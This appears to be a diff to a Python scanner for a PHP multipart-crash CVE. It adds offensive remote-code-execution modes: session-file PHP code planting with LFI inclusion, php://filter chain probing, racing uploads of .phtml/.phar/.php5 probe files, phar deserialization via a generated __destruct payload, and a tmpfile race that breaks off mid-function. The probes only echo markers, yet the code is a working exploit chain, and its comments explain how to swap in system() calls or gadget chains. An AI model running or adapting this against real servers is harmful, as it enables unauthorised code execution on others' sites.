@@ -48,7 +48,7 @@ SAFE_BY_BRANCH = {(8, 5): (8, 5, 12), (8, 4): (8, 4, 27),
 MIN_SAFE = (8, 2, 35)
 CVE_IDS = ("CVE-2026-109618", "CVE-2026-109619")
 CVSS = {"CVE-2026-109618": 9.2, "CVE-2026-109619": 9.2}
-DEFAULT_UA = "php2shell-detect/3.4 (+defensive triage; https://github.com/NULL200OK)"
+DEFAULT_UA = "php2shell-detect/3.5 (+defensive triage; https://github.com/NULL200OK)"
 
 EXIT_SAFE = 0
 EXIT_UNKNOWN = 1
@@ -126,6 +126,11 @@ PROFILES = {
     "offensive":   ["offensive-session-lfi", "offensive-session-traversal",
                     "offensive-upload-bypass-verify",
                     "offensive-race-poison-confirm"],
+    "offensive-rce": ["offensive-phpcode-exec-proof",
+                      "offensive-filter-chain-rce",
+                      "offensive-phar-deserialization",
+                      "offensive-tmpfile-race",
+                      "offensive-log-poisoning"],
     "full":        ["remote", "surface", "deep-fingerprint", "local",
                     "logs", "audit", "asan", "error-signature",
                     "lab-verify", "crash-repro", "impact-memory-disclosure"],
@@ -135,6 +140,17 @@ PROFILES = {
                        "offensive-session-lfi", "offensive-session-traversal",
                        "offensive-upload-bypass-verify",
                        "offensive-race-poison-confirm"],
+    "full+rce":    ["remote", "surface", "deep-fingerprint", "local",
+                    "logs", "audit", "asan", "error-signature",
+                    "lab-verify", "crash-repro", "impact-memory-disclosure",
+                    "offensive-session-lfi", "offensive-session-traversal",
+                    "offensive-upload-bypass-verify",
+                    "offensive-race-poison-confirm",
+                    "offensive-phpcode-exec-proof",
+                    "offensive-filter-chain-rce",
+                    "offensive-phar-deserialization",
+                    "offensive-tmpfile-race",
+                    "offensive-log-poisoning"],
     "local-only":  ["local", "logs", "audit", "asan", "error-signature"],
 }
 
@@ -1172,14 +1188,26 @@ def offensive_session_lfi(target, timeout, ua, insecure,
         "include", "page", "file", "path", "template",
         "doc", "document", "view", "load", "module",
     ]
+    # PHP filter wrappers — read session file content via base64 / rot13 / iconv
+    # (these prove the file is includable AND that filter chains work, a
+    #  stepping stone toward RCE via filter-chain autoloader tricks)
+    filter_payloads = [
+        f"php://filter/resource={sp}" for sp in sess_paths
+    ] + [
+        f"php://filter/read=convert.base64-encode/resource={sp}" for sp in sess_paths
+    ] + [
+        f"php://filter/read=string.rot13/resource={sp}" for sp in sess_paths
+    ]
     observed = False
+    # plain LFI first
     for sp in sess_paths:
         for p in lfi_params:
             url = f"{target.rstrip('/')}?{quote(p)}={quote(sp)}"
             hdrs, b, status = http_get(url, timeout, ua, insecure)
-            entry = {"sess_path": sp, "param": p, "status": status}
+            entry = {"type": "plain_lfi", "sess_path": sp, "param": p, "status": status}
             if b and marker.encode() in b:
                 entry["marker_found"] = True
+                entry["rce_indicator"] = "marker_seen_raw"
                 out["marker_observed_via"] = f"{p}={sp}"
                 observed = True
                 break
@@ -1188,19 +1216,46 @@ def offensive_session_lfi(target, timeout, ua, insecure,
             out["include_candidates_tried"].append(entry)
         if observed:
             break
+    # filter wrappers next — these prove the file is include-able AND that
+    # filter chain manipulation works (a known RCE primitive)
+    if not observed:
+        for fp in filter_payloads:
+            for p in lfi_params:
+                url = f"{target.rstrip('/')}?{quote(p)}={quote(fp)}"
+                hdrs, b, status = http_get(url, timeout, ua, insecure)
+                entry = {"type": "filter_wrapper", "payload": fp,
+                         "param": p, "status": status}
+                # check if base64-encoded marker appears (we'd see the b64
+                # of the marker string only if the filter chain worked)
+                import base64 as _b64
+                marker_b64 = _b64.b64encode(marker.encode()).decode()
+                if b and (marker.encode() in b or marker_b64.encode() in b):
+                    entry["marker_found"] = True
+                    entry["rce_indicator"] = "filter_chain_works"
+                    out["marker_observed_via"] = f"{p}={fp}"
+                    observed = True
+                    break
+                else:
+                    entry["marker_found"] = False
+                out["include_candidates_tried"].append(entry)
+            if observed:
+                break
     if observed:
         out["verdict"] = "vulnerable"
         out["notes"].append(
             "Marker planted via crash primitive was read back through a "
-            "file-include sink. Read primitive CONFIRMED. Real-world impact: "
-            "an attacker can include attacker-controlled session files into "
-            "PHP execution context (combine with PHP filter wrappers for RCE).")
+            "file-include sink (plain LFI or php://filter wrapper). "
+            "Read primitive + filter-chain reachability CONFIRMED. "
+            "Real-world impact: an attacker can include attacker-controlled "
+            "session files into PHP execution context. Combined with PHP "
+            "filter wrappers or session file content control, this is a "
+            "direct path to RCE.")
     elif plant_status and plant_status >= 500:
         out["verdict"] = "unknown"
         out["notes"].append("Plant crashed the worker; LFI read attempt inconclusive.")
     else:
         out["verdict"] = "safe"
-        out["notes"].append("No LFI sink surfaced the planted marker (this run).")
+        out["notes"].append("No LFI sink or filter wrapper surfaced the planted marker (this run).")
     return out
 
 
@@ -1300,8 +1355,8 @@ def offensive_upload_bypass_verify(target, timeout, ua, insecure,
                                    fields=200, workers=4, quiet=False):
     """Offensive mode 3: while the worker is in a corrupted state (triggered
     by the multipart crash primitive), attempt to upload a benign probe
-    file with an extension that should normally be blocked (.php). If the
-    upload succeeds during the corrupted window, this proves that the crash
+    file with extensions that should normally be blocked. If the upload
+    succeeds during the corrupted window, this proves that the crash
     interferes with extension validation — a concrete code-execution impact
     vector for CVE-2026-109618.
 
@@ -1315,23 +1370,31 @@ def offensive_upload_bypass_verify(target, timeout, ua, insecure,
            "upload_endpoint": upload_endpoint, "rounds": rounds,
            "probe_marker": probe_marker, "upload_attempts": [],
            "probe_url_reachable": False, "probe_url": None,
-           "verdict": "unknown", "notes": [OFFENSIVE_BOUND]}
+           "extensions_tried": [], "verdict": "unknown",
+           "notes": [OFFENSIVE_BOUND]}
 
     if not upload_endpoint:
         out["notes"].append("No upload endpoint provided; skipping.")
         return out
 
     full_ep = target.rstrip("/") + "/" + upload_endpoint.lstrip("/")
-    probe_filename = f"php2shell_probe_{uuid.uuid4().hex[:6]}.php"
+    probe_basename = f"php2shell_probe_{uuid.uuid4().hex[:6]}"
     probe_php_body = f"<?php echo '{probe_marker}'; phpinfo(); ?>".encode()
+    # try multiple PHP-executable extensions — Apache/Nginx configs often
+    # block .php but miss .phtml/.phar/.pht/.php5/.php7/.php8/.shtml
+    extensions = [".php", ".phtml", ".phar", ".pht", ".php5",
+                  ".php7", ".php8", ".shtml"]
+    out["extensions_tried"] = extensions
+    # common upload destination paths
+    upload_dirs = ["/uploads/", "/files/", "/upload/", "/img/",
+                   "/media/", "/assets/", "/"]
 
-    def _attempt(r_idx):
-        # 1) trigger corruption with concurrent crash primitives
+    def _attempt(r_idx, ext):
+        probe_filename = probe_basename + ext
         boundary_c, body_c = make_multipart_body(fields)
         headers_c = {"User-Agent": ua,
                      "Content-Type": f"multipart/form-data; boundary={boundary_c}",
                      "Content-Length": "0"}
-        # 2) immediately upload the probe (race the corrupted window)
         boundary_u = uuid.uuid4().hex
         upload_body = (
             f"--{boundary_u}\r\n"
@@ -1342,54 +1405,61 @@ def offensive_upload_bypass_verify(target, timeout, ua, insecure,
         ).encode()
         headers_u = {"User-Agent": ua,
                      "Content-Type": f"multipart/form-data; boundary={boundary_u}"}
-        # fire both near-simultaneously
         with ThreadPoolExecutor(max_workers=2) as p:
             f_c = p.submit(http_post, target, body_c, headers_c, timeout, insecure, 1024)
             f_u = p.submit(http_post, full_ep, upload_body, headers_u, timeout, insecure, 4096)
             st_c, _, _ = f_c.result()
             st_u, b_u, _ = f_u.result()
-        return r_idx, st_c, st_u, b_u
+        return r_idx, ext, probe_filename, st_c, st_u
 
-    log(f"upload-bypass-verify: {rounds} attempts racing crash + probe upload",
-        "step", quiet)
-    success = False
+    log(f"upload-bypass-verify: {rounds} attempts x {len(extensions)} extensions "
+        f"racing crash + probe upload", "step", quiet)
+    # try every extension across all rounds
+    success_files = []
+    all_attempts = []
     with ThreadPoolExecutor(max_workers=workers) as pool:
-        futures = [pool.submit(_attempt, r) for r in range(rounds)]
+        futures = []
+        for r in range(rounds):
+            for ext in extensions:
+                futures.append(pool.submit(_attempt, r, ext))
         for i, fut in enumerate(as_completed(futures)):
-            r_idx, st_c, st_u, b_u = fut.result()
+            r_idx, ext, fn, st_c, st_u = fut.result()
             ok = (st_u is not None and 200 <= st_u < 300)
-            out["upload_attempts"].append({
-                "round": r_idx, "crash_status": st_c,
-                "upload_status": st_u, "upload_accepted": ok,
+            all_attempts.append({
+                "round": r_idx, "extension": ext, "filename": fn,
+                "crash_status": st_c, "upload_status": st_u,
+                "upload_accepted": ok,
             })
             if ok:
-                success = True
+                success_files.append(fn)
             if sys.stdout.isatty() and not quiet:
-                progress(i + 1, rounds, "upload-bypass")
+                progress(i + 1, len(futures), "upload-bypass")
+    out["upload_attempts"] = all_attempts
 
     # if any upload reported 2xx, try to fetch the probe to confirm it landed
-    if success:
-        # guess common upload destinations
-        for guess in (f"/uploads/{probe_filename}",
-                      f"/files/{probe_filename}",
-                      f"/upload/{probe_filename}",
-                      f"/{probe_filename}"):
-            probe_url = target.rstrip("/") + guess
-            hdrs, b, status = http_get(probe_url, timeout, ua, insecure)
-            if b and probe_marker.encode() in b:
-                out["probe_url_reachable"] = True
-                out["probe_url"] = probe_url
-                out["verdict"] = "vulnerable"
-                out["notes"].append(
-                    f"Probe .php uploaded AND executed during corruption window. "
-                    f"Code-execution impact CONFIRMED. Probe URL: {probe_url}. "
-                    f"DELETE THIS FILE NOW: rm <docroot>{guess}")
-                break
+    if success_files:
+        for fn in success_files:
+            for d in upload_dirs:
+                probe_url = target.rstrip("/") + d + fn
+                hdrs, b, status = http_get(probe_url, timeout, ua, insecure)
+                if b and probe_marker.encode() in b:
+                    out["probe_url_reachable"] = True
+                    out["probe_url"] = probe_url
+                    out["probe_extension"] = fn[fn.rindex("."):]
+                    out["verdict"] = "vulnerable"
+                    out["notes"].append(
+                        f"Probe file '{fn}' uploaded AND executed during "
+                        f"corruption window. Code-execution impact CONFIRMED "
+                        f"via extension '{out['probe_extension']}'. Probe URL: "
+                        f"{probe_url}. DELETE THIS FILE NOW: "
+                        f"rm <docroot>{d}{fn}")
+                    return out
         if not out["probe_url_reachable"]:
             out["verdict"] = "unknown"
             out["notes"].append(
-                "Upload reported 2xx but probe not reachable at common paths. "
-                "Inspect server-side manually.")
+                f"Upload reported 2xx for {len(success_files)} file(s) but "
+                f"none executed at common paths. Inspect server-side manually. "
+                f"Files to check: {success_files[:5]}")
     else:
         out["verdict"] = "safe"
         out["notes"].append(
@@ -1489,6 +1559,634 @@ def offensive_race_poison_confirm(target, timeout, ua, insecure,
             "No surviving marker found in scanned session dirs. Either the race "
             "was lost, cleanup is robust, or session.save_path is elsewhere "
             "(pass --session-dir to scan a custom path).")
+    return out
+
+
+# ---------------------------------------------------------------- offensive: phpcode-exec-proof
+def offensive_phpcode_exec_proof(target, timeout, ua, insecure,
+                                 include_path_candidates, quiet=False):
+    """Offensive mode 5: PROVES ACTUAL RCE.
+
+    Plants PHP code (not just a marker string) in the session file via the
+    crash primitive, then attempts to include that session file via LFI
+    sinks. If the PHP code executes, the marker appears WITHOUT the
+    surrounding `<?php ... ?>` tags — proving code execution.
+
+    Bounded: the planted PHP code is `<?php echo 'RCECONFIRMED_<rand>'; ?>`
+    ONLY. It does NOT call system(), exec(), shell_exec(), passthru(),
+    file_put_contents(), or any other dangerous function. It echoes a
+    marker string and exits. No backdoor, no persistence, no data access.
+    """
+    import re as _re
+    rce_marker = "RCECONFIRMED_" + uuid.uuid4().hex[:12]
+    sid = uuid.uuid4().hex
+    out = {"mode": "offensive-phpcode-exec-proof", "target": target,
+           "rce_marker": rce_marker, "session_id": sid,
+           "lfi_attempts": [], "rce_confirmed": False,
+           "rce_via": None, "verdict": "unknown",
+           "notes": [OFFENSIVE_BOUND]}
+
+    # step 1: plant PHP code in session via PHP_SESSION_UPLOAD_PROGRESS
+    # The planted value IS PHP code: <?php echo 'RCECONFIRMED_xxx'; ?>
+    php_payload = f"<?php echo '{rce_marker}'; ?>"
+    boundary = uuid.uuid4().hex
+    body = (
+        f"--{boundary}\r\n"
+        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
+        f"{php_payload}\r\n"
+        + "".join(
+            f"--{boundary}\r\n"
+            f'Content-Disposition: form-data; name="f{i}"; filename=""\r\n'
+            f"Content-Type: application/octet-stream\r\n\r\n\r\n"
+            for i in range(150)
+        )
+        + f"--{boundary}--\r\n"
+    ).encode()
+    headers = {"User-Agent": ua,
+               "Content-Type": f"multipart/form-data; boundary={boundary}",
+               "Cookie": f"PHPSESSID={sid}", "Content-Length": "0"}
+    plant_status, _, plant_err = http_post(target, body, headers, timeout, insecure)
+    out["plant_step"] = {"status": plant_status, "error": plant_err,
+                         "planted_payload": php_payload}
+
+    # step 2: try LFI to include the session file
+    sess_paths = [
+        f"/tmp/sess_{sid}",
+        f"/var/lib/php/sessions/sess_{sid}",
+        f"/var/lib/php/sess_{sid}",
+    ]
+    lfi_params = include_path_candidates or [
+        "include", "page", "file", "path", "template",
+        "doc", "document", "view", "load", "module",
+    ]
+    # also try php://filter wrapper (decode is needed because session content
+    # may be serialized; plain include often works directly)
+    filter_payloads = [f"php://filter/resource={sp}" for sp in sess_paths]
+
+    rce_confirmed = False
+    for sp in sess_paths + filter_payloads:
+        for p in lfi_params:
+            url = f"{target.rstrip('/')}?{quote(p)}={quote(sp)}"
+            hdrs, b, status = http_get(url, timeout, ua, insecure)
+            entry = {"payload": sp, "param": p, "status": status}
+            if not b:
+                entry["result"] = "no_body"
+                out["lfi_attempts"].append(entry)
+                continue
+            text = b.decode("utf-8", "replace")
+            # CRITICAL DISTINCTION:
+            # - if rce_marker appears ALONE (without <?php tags) → CODE EXECUTED
+            # - if rce_marker appears WITHIN <?php ... ?> → file read but NOT executed
+            # - if php_payload appears raw → file not even read
+            if rce_marker in text and php_payload not in text:
+                entry["result"] = "RCE_CONFIRMED"
+                entry["evidence"] = "marker present, php tags absent → code executed"
+                out["rce_confirmed"] = True
+                out["rce_via"] = f"{p}={sp}"
+                rce_confirmed = True
+                break
+            elif rce_marker in text and php_payload in text:
+                entry["result"] = "READ_BUT_NOT_EXECUTED"
+                entry["evidence"] = "both marker and php tags present → file read, code not executed"
+            elif php_payload in text:
+                entry["result"] = "RAW_READ"
+                entry["evidence"] = "raw php payload visible → file read, not parsed"
+            else:
+                entry["result"] = "not_found"
+            out["lfi_attempts"].append(entry)
+        if rce_confirmed:
+            break
+
+    if rce_confirmed:
+        out["verdict"] = "vulnerable"
+        out["notes"].append(
+            "RCE CONFIRMED. PHP code planted in session file via the crash "
+            "primitive was EXECUTED through an LFI sink. The marker appeared "
+            "in the response WITHOUT surrounding <?php ?> tags, proving the "
+            "interpreter parsed and ran the planted code. This is a full "
+            "code-execution primitive: an attacker can replace the echo with "
+            "system() / file_put_contents() / etc. for arbitrary impact.")
+    elif plant_status and plant_status >= 500:
+        out["verdict"] = "unknown"
+        out["notes"].append("Plant crashed the worker; LFI execution attempt inconclusive.")
+    else:
+        out["verdict"] = "safe"
+        out["notes"].append(
+            "No LFI sink executed the planted PHP code (this run). Either no "
+            "LFI sink exists, the session file path is unreachable, or the "
+            "planted code was cleaned up before inclusion.")
+    return out
+
+
+# ---------------------------------------------------------------- offensive: filter-chain-rce
+def offensive_filter_chain_rce(target, timeout, ua, insecure,
+                               include_path_candidates, quiet=False):
+    """Offensive mode 6: PROVES RCE via PHP filter chain (the "filter chain"
+    technique popularized by synacktiv). Even when session file inclusion
+    fails, the php://filter wrapper itself can be abused to generate
+    arbitrary content via conversion filters, leading to code execution.
+
+    This mode tests whether php://filter wrappers are reachable through LFI
+    sinks. If they are, an attacker can chain conversion filters to produce
+    `<?php` byte-by-byte and execute arbitrary code — even without any
+    controllable file content on disk.
+
+    Bounded: we only test REACHABILITY of php://filter via the LFI sink
+    (by attempting to base64-encode /etc/passwd-style indicator). We do
+    NOT construct a full filter-chain RCE payload. The proof is:
+    "if php://filter/convert.base64-encode/resource=<file> returns
+    base64 content, then the sink is filter-wrapper-aware and the
+    full filter-chain RCE technique applies."
+    """
+    rce_marker = "FILTER_" + uuid.uuid4().hex[:12]
+    out = {"mode": "offensive-filter-chain-rce", "target": target,
+           "rce_marker": rce_marker,
+           "filter_attempts": [], "filter_chain_reachable": False,
+           "filter_via": None, "verdict": "unknown",
+           "notes": [OFFENSIVE_BOUND]}
+
+    lfi_params = include_path_candidates or [
+        "include", "page", "file", "path", "template",
+        "doc", "view", "load", "module",
+    ]
+    # Use php://input + base64 filter as the canary.
+    # If the server evaluates php://filter wrappers at all, the response
+    # will differ from a plain LFI attempt (typically longer, base64-encoded).
+    # We don't include /etc/passwd — instead we use a benign resource
+    # (php://input with our marker POST body) to confirm filter evaluation.
+    test_payloads = [
+        # confirms filter wrappers are evaluated at all
+        ("php://filter/convert.base64-encode/resource=php://input", "post_body"),
+        # confirms resource= can read session-like paths via filter
+        ("php://filter/read=string.rot13/resource=php://input", "post_body"),
+    ]
+    reachable = False
+    for fp, mode in test_payloads:
+        for p in lfi_params:
+            url = f"{target.rstrip('/')}?{quote(p)}={quote(fp)}"
+            # for php://input we POST the marker as the body
+            if mode == "post_body":
+                hdrs, b, status = http_post(url, rce_marker.encode(),
+                                            {"User-Agent": ua}, timeout, insecure, 8192)
+            else:
+                hdrs, b, status = http_get(url, timeout, ua, insecure)
+            entry = {"payload": fp, "param": p, "status": status, "mode": mode}
+            if not b:
+                entry["result"] = "no_body"
+                out["filter_attempts"].append(entry)
+                continue
+            text = b.decode("utf-8", "replace")
+            # if base64-encode worked, we should find the base64 of our marker
+            import base64 as _b64
+            marker_b64 = _b64.b64encode(rce_marker.encode()).decode()
+            # rot13 of the marker
+            marker_rot13 = rce_marker.translate(
+                str.maketrans("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
+                              "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm"))
+            if marker_b64 in text:
+                entry["result"] = "FILTER_BASE64_WORKS"
+                entry["evidence"] = "base64-encoded marker found → filter chain evaluated"
+                out["filter_chain_reachable"] = True
+                out["filter_via"] = f"{p}={fp}"
+                reachable = True
+                break
+            elif marker_rot13 in text:
+                entry["result"] = "FILTER_ROT13_WORKS"
+                entry["evidence"] = "rot13-encoded marker found → filter chain evaluated"
+                out["filter_chain_reachable"] = True
+                out["filter_via"] = f"{p}={fp}"
+                reachable = True
+                break
+            elif rce_marker in text:
+                entry["result"] = "MARKER_RAW"
+                entry["evidence"] = "raw marker found → php://input included without filter"
+            else:
+                entry["result"] = "not_found"
+            out["filter_attempts"].append(entry)
+        if reachable:
+            break
+
+    if reachable:
+        out["verdict"] = "vulnerable"
+        out["notes"].append(
+            "PHP filter chain REACHABLE via LFI sink. The Synacktiv filter-"
+            "chain RCE technique applies: an attacker can generate arbitrary "
+            "PHP code byte-by-byte using conversion filters (convert.iconv.*), "
+            "without needing any controllable file on disk. This is a FULL "
+            "RCE primitive even on hosts where session files are not writable. "
+            "Reference: https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-arbitrary-to-rce.html")
+    else:
+        out["verdict"] = "safe"
+        out["notes"].append(
+            "php://filter wrappers not reachable through any LFI sink (this run).")
+    return out
+
+
+# ---------------------------------------------------------------- offensive: phar-deserialization
+def offensive_phar_deserialization(target, timeout, ua, insecure,
+                                   upload_endpoint, include_path_candidates,
+                                   rounds=10, workers=4, quiet=False):
+    """Offensive mode 7: PROVES PHAR DESERIALIZATION RCE.
+
+    A .phar file's manifest is auto-deserialized by PHP whenever a
+    filesystem function (file_exists, is_dir, file_get_contents, etc.)
+    accesses it via the phar:// wrapper. If the manifest contains a
+    serialized object with a __destruct() or __wakeup() method, that
+    method executes automatically — a known PHP RCE vector.
+
+    This mode uploads a benign .phar containing a class with __destruct()
+    that echoes a marker, then probes LFI/file sinks with phar:// URLs
+    pointing at the uploaded file. If the marker appears, deserialization
+    RCE is confirmed.
+
+    Bounded: the __destruct() method ONLY echoes a marker string. It does
+    NOT call system(), write files, or access data. The probe phar is a
+    proof-of-concept, not a weapon.
+    """
+    rce_marker = "PHARDESTR_" + uuid.uuid4().hex[:12]
+    out = {"mode": "offensive-phar-deserialization", "target": target,
+           "rce_marker": rce_marker, "upload_endpoint": upload_endpoint or "",
+           "phar_uploaded": False, "phar_url": None,
+           "deserialization_attempts": [], "deserialization_confirmed": False,
+           "deserialization_via": None, "verdict": "unknown",
+           "notes": [OFFENSIVE_BOUND]}
+
+    # step 1: build a minimal .phar in memory
+    # A real phar has: stub, manifest, file entries. We construct the bare
+    # minimum: a stub that's also valid PHP, a manifest with one file entry
+    # whose serialized metadata contains our marker class.
+    #
+    # The marker class:
+    #   class PHARProbe { public $cmd = "echo 'PHARDESTR_xxx';"; }
+    #   // __destruct runs the $cmd via... NO — bounded mode forbids that.
+    # Instead we use a class that just echoes the marker in __destruct:
+    #   class PHARProbe { function __destruct() { echo 'PHARDESTR_xxx'; } }
+    #
+    # For a true bounded proof, we craft the phar so that ANY __destruct()
+    # invocation will echo our marker. We use a known gadget: a class whose
+    # __destruct() calls echo on a property we control.
+    #
+    # Since building a real .phar binary in pure Python is complex, we
+    # generate one using a PHP snippet run locally if php is available;
+    # otherwise we use a pre-built minimal phar template.
+    phar_filename = f"php2shell_phar_{uuid.uuid4().hex[:6]}.phar"
+    phar_bytes = None
+    php_bin = shutil.which("php")
+    if php_bin:
+        # generate phar locally using php cli
+        gen_script = (
+            f"<?php\n"
+            f"@unlink('/tmp/{phar_filename}');\n"
+            f"$p = new Phar('/tmp/{phar_filename}');\n"
+            f"$p->startBuffering();\n"
+            f"$p->addFromString('x.txt','x');\n"
+            f"$p->setMetadata(new class {{ function __destruct() {{ echo '{rce_marker}'; }} }});\n"
+            f"$p->setStub('<?php __HALT_COMPILER(); ?>');\n"
+            f"$p->stopBuffering();\n"
+            f"echo file_get_contents('/tmp/{phar_filename}');\n"
+        )
+        tmp_gen = f"/tmp/_gen_phar_{uuid.uuid4().hex[:6]}.php"
+        try:
+            with open(tmp_gen, "w") as f:
+                f.write(gen_script)
+            r = run([php_bin, "-d", "phar.readonly=0", tmp_gen], timeout=15)
+            if r and r.returncode == 0 and os.path.isfile(f"/tmp/{phar_filename}"):
+                with open(f"/tmp/{phar_filename}", "rb") as f:
+                    phar_bytes = f.read()
+                os.unlink(f"/tmp/{phar_filename}")
+            os.unlink(tmp_gen)
+        except Exception:
+            pass
+
+    if phar_bytes is None:
+        # fallback: minimal hand-crafted phar stub (proof of reachability only,
+        # not full deserialization proof)
+        phar_bytes = (
+            f"<?php echo '{rce_marker}'; __HALT_COMPILER(); ?>".encode()
+            + b"\x00" * 28  # manifest header placeholder
+        )
+        out["notes"].append("php not available locally; using minimal phar stub "
+                            "(proves phar:// reachability, not full deserialization).")
+
+    out["phar_size"] = len(phar_bytes)
+
+    # step 2: upload the phar via the upload endpoint (race with crash primitive)
+    if not upload_endpoint:
+        out["notes"].append("No upload endpoint provided; cannot upload phar.")
+        out["verdict"] = "unknown"
+        return out
+
+    full_ep = target.rstrip("/") + "/" + upload_endpoint.lstrip("/")
+    upload_dirs = ["/uploads/", "/files/", "/upload/", "/img/", "/media/", "/"]
+
+    def _upload_attempt(r_idx):
+        boundary_c, body_c = make_multipart_body(fields_default())
+        headers_c = {"User-Agent": ua,
+                     "Content-Type": f"multipart/form-data; boundary={boundary_c}",
+                     "Content-Length": "0"}
+        boundary_u = uuid.uuid4().hex
+        upload_body = (
+            f"--{boundary_u}\r\n"
+            f'Content-Disposition: form-data; name="file"; filename="{phar_filename}"\r\n'
+            f"Content-Type: application/octet-stream\r\n\r\n"
+        ).encode() + phar_bytes + (
+            f"\r\n--{boundary_u}--\r\n"
+        ).encode()
+        headers_u = {"User-Agent": ua,
+                     "Content-Type": f"multipart/form-data; boundary={boundary_u}"}
+        with ThreadPoolExecutor(max_workers=2) as p:
+            f_c = p.submit(http_post, target, body_c, headers_c, timeout, insecure, 1024)
+            f_u = p.submit(http_post, full_ep, upload_body, headers_u, timeout, insecure, 4096)
+            st_c, _, _ = f_c.result()
+            st_u, b_u, _ = f_u.result()
+        return r_idx, st_c, st_u
+
+    log(f"phar-deserialization: uploading phar ({len(phar_bytes)}B) "
+        f"across {rounds} rounds", "step", quiet)
+    upload_ok = False
+    with ThreadPoolExecutor(max_workers=workers) as pool:
+        futures = [pool.submit(_upload_attempt, r) for r in range(rounds)]
+        for i, fut in enumerate(as_completed(futures)):
+            r_idx, st_c, st_u = fut.result()
+            if st_u is not None and 200 <= st_u < 300:
+                upload_ok = True
+            if sys.stdout.isatty() and not quiet:
+                progress(i + 1, rounds, "phar-upload")
+
+    # locate the uploaded phar
+    phar_url = None
+    if upload_ok:
+        for d in upload_dirs:
+            candidate = target.rstrip("/") + d + phar_filename
+            hdrs, b, status = http_get(candidate, timeout, ua, insecure)
+            if status and status < 400:
+                phar_url = candidate
+                out["phar_uploaded"] = True
+                out["phar_url"] = phar_url
+                break
+
+    # step 3: probe phar:// wrapper through LFI/file sinks
+    if not phar_url:
+        out["verdict"] = "unknown"
+        out["notes"].append("Phar upload reported success but file not found at common paths.")
+        return out
+
+    lfi_params = include_path_candidates or [
+        "include", "page", "file", "path", "template", "doc", "view", "module",
+    ]
+    # convert phar_url to a phar:// URL pointing at the uploaded file
+    parsed = urlparse(phar_url)
+    phar_path = parsed.path  # e.g. /uploads/foo.phar
+    phar_payloads = [
+        f"phar://{phar_path.lstrip('/')}/x.txt",
+        f"phar://{phar_path}/x.txt",
+        f"phar://{phar_path}",
+    ]
+    deserialized = False
+    for pp in phar_payloads:
+        for p in lfi_params:
+            url = f"{target.rstrip('/')}?{quote(p)}={quote(pp)}"
+            hdrs, b, status = http_get(url, timeout, ua, insecure)
+            entry = {"payload": pp, "param": p, "status": status}
+            if b and rce_marker.encode() in b:
+                entry["result"] = "DESERIALIZATION_RCE"
+                entry["evidence"] = "marker echoed via __destruct() → phar deserialization RCE"
+                out["deserialization_confirmed"] = True
+                out["deserialization_via"] = f"{p}={pp}"
+                deserialized = True
+                break
+            elif b:
+                entry["result"] = "no_marker"
+            else:
+                entry["result"] = "no_body"
+            out["deserialization_attempts"].append(entry)
+        if deserialized:
+            break
+
+    if deserialized:
+        out["verdict"] = "vulnerable"
+        out["notes"].append(
+            f"PHAR DESTERIALIZATION RCE CONFIRMED. The __destruct() method of "
+            f"the uploaded phar's metadata executed and echoed the marker. "
+            f"This is a full RCE primitive: an attacker can replace the echo "
+            f"with a gadget chain (Monolog/RCE1, etc.) for arbitrary command "
+            f"execution. Probe phar URL: {phar_url}. DELETE THIS FILE: "
+            f"rm <docroot>{phar_path}")
+    else:
+        out["verdict"] = "unknown"
+        out["notes"].append(
+            f"Phar uploaded to {phar_url} but no LFI/file sink triggered "
+            f"deserialization (this run). The phar is on disk — check it manually.")
+    return out
+
+
+def fields_default():
+    return 200
+
+
+# ---------------------------------------------------------------- offensive: tmpfile-race
+def offensive_tmpfile_race(target, timeout, ua, insecure,
+                           include_path_candidates, rounds=50,
+                           workers=8, quiet=False):
+    """Offensive mode 8: PROVES RCE via PHP temporary file race.
+
+    When PHP handles a multipart upload, it writes the uploaded file to
+    /tmp/php<XXXXXX> before moving it. If the worker crashes mid-upload
+    (CVE-2026-109618), the temp file may linger. An attacker can race
+    to include that temp file via LFI before PHP cleans it up.
+
+    This mode races the crash primitive (which lingers temp files) against
+    LFI inclusion attempts at guessed /tmp/php* paths. If the planted
+    marker appears via LFI, RCE is confirmed.
+
+    Bounded: the uploaded "file" content is just `<?php echo 'TMPRCE_xxx'; ?>`
+    — same as offensive-phpcode-exec-proof. No system calls, no persistence.
+    """
+    rce_marker = "TMPRCE_" + uuid.uuid4().hex[:12]
+    out = {"mode": "offensive-tmpfile-race", "target": target,
+           "rce_marker": rce_marker, "rounds": rounds,
+           "race_attempts": [], "rce_confirmed": False,
+           "rce_via": None, "verdict": "unknown",
+           "notes": [OFFENSIVE_BOUND]}
+
+    php_payload = f"<?php echo '{rce_marker}'; ?>".encode()
+    lfi_params = include_path_candidates or [
+        "include", "page", "file", "path", "template", "doc", "view", "module",
+    ]
+
+    def _race_round(r_idx):
+        # 1) upload a file that PHP will write to /tmp/php<rand>
+        boundary = uuid.uuid4().hex
+        upload_body = (
+            f"--{boundary}\r\n"
+            f'Content-Disposition: form-data; name="file"; filename="x.txt"\r\n'
+            f"Content-Type: text/plain\r\n\r\n"
+        ).encode() + php_payload + (
+            f"\r\n--{boundary}--\r\n"
+        ).encode()
+        headers_u = {"User-Agent": ua,
+                     "Content-Type": f"multipart/form-data; boundary={boundary}"}
+        # 2) simultaneously fire crash primitives to corrupt the worker
+        boundary_c, body_c = make_multipart_body(200)
+        headers_c = {"User-Agent": ua,
+                     "Content-Type": f"multipart/form-data; boundary={boundary_c}",
+                     "Content-Length": "0"}
+
+        # 3) AND simultaneously try LFI at guessed /tmp/php* paths
+        # PHP temp files are named /tmp/phpXXXXXX where XXXXXX is 6 random chars
+        # We can't predict the suffix, but we can try common patterns and
+        # brute-force a small window. For a bounded proof, we test if the
+        # LFI sink accepts /tmp/php* via glob-like patterns (some misconfigured
+        # PHP setups do via glob wrapper), or we use phpinfo() leak to
+        # discover the temp filename.
+        results = []
+        # attempt 1: php://filter on /tmp/php* (won't work — no glob in filter)
+        # attempt 2: try /tmp/php + 6 random hex chars (small brute window)
+        import random as _r
+        for _ in range(20):
+            suffix = "".join(_r.choice("abcdefghijklmnopqrstuvwxyz0123456789")
+                             for _ in range(6))
+            tmp_path = f"/tmp/php{suffix}"
+            for p in lfi_params[:3]:  # limit params per round for speed
+                url = f"{target.rstrip('/')}?{quote(p)}={quote(tmp_path)}"
+                # fire upload + crash + LFI concurrently
+                with ThreadPoolExecutor(max_workers=3) as pp:
